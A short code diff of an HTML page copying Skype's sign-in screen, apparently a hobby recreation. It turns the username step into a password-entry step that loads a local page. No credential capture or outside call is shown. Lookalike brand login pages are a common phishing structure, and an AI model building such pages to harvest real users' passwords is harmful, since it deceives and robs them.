@@ -9,29 +9,28 @@
     <title>Skype</title>
 </head>
 
-<body>
+<body onLoad="getUname()">
     <!-- Unified Skype Login View -->
     <div class="view noflip unifiedSkypeLoginView" id="unifiedSkypeLoginView">
         <span class="logo"></span>
         <div class="pageTitleOrErrorMsgContainer" id="pageTitleOrErrorMsgContainer">
-            <h1 id="unifiedLoginHeader" class="unifiedLoginHeader">Sign in <span class="subtitle">with Skype or Microsoft account</span></h1>
+            <h1 id="unifiedLoginHeader" class="unifiedLoginHeader">Enter password<span class="subtitle" id="ermwhatthesigma">Enter the password for user</span></h1>
             <div id="unifiedLoginError" class="unifiedLoginError" role="alert" aria-live="assertive" style="display: none;">
                 <div class="message" id="unifiedMessageErrorSkypeLogin" role="alert">
                     <span class="messageBody"></span>
                 </div>
             </div>
         </div>
-        <form id="unifiedForm" class="unifiedForm" action="loginPwd.html" method="get">
+        <form id="unifiedForm" class="unifiedForm" action="load.html">
             <div id="unifiedUsernameContainer" class="unifiedUsernameContainer">
                 <input
-                    type="text"
-                    id="unifiedUsername"
+                    type="password"
+                    id="unifiedPassword"
                     class="unifiedUsername"
                     maxlength="150"
                     role="textbox"
                     aria-labelledby="usernameSimulatedPlaceholder"
-                    placeholder="Skype Name, email or phone"
-                    name="uname"
+                    placeholder="Password"
                 />
             </div>
             <div class="login__button-bar">
